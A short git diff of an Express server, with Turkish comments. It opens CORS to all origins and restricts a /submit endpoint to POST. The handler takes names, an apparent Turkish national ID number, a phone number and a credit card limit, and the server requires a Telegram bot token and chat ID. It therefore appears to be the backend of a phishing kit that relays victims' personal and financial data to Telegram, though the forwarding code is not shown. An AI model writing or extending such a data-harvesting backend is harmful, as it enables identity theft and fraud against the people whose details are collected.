@@ -9,11 +9,8 @@ const app = express();
 const port = process.env.PORT || 3001;
 
 app.use(express.json());
-app.use(cors({
-  origin: process.env.ALLOWED_ORIGIN || 'http://localhost:3000', // Varsayılan olarak yerel geliştirme için
-  methods: ['POST'],
-  allowedHeaders: ['Content-Type'],
-}));
+// CORS kısıtlaması kaldırıldı, tüm origin'ler kabul edilecek
+app.use(cors());
 
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
@@ -23,6 +20,15 @@ if (!botToken || !chatId) {
   process.exit(1);
 }
 
+// Tüm istekler için metod kontrolü
+app.all('/submit', (req, res, next) => {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Yalnızca POST istekleri kabul edilir' });
+  }
+  next();
+});
+
+// POST isteklerini işleme
 app.post('/submit', async (req, res) => {
   const { isim, soyisim, tc, tel, kredi_karti_limiti } = req.body;
 
